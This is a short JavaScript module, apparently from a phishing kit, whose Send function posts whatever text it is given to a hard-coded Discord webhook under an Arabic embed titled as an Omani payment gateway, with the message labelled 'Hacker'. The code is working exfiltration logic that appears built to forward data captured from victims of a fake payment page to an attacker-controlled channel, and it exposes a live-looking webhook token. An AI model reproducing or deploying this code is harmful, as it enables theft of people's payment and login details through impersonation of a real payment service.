import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " بوابة سداد عمان ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1523446328036688005/k4DVF66aCdLWc3UDCM970DAW6CX4ud6VOT1l0b13NTezYZptOIQuCV2ex8SU7hLk88zG",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
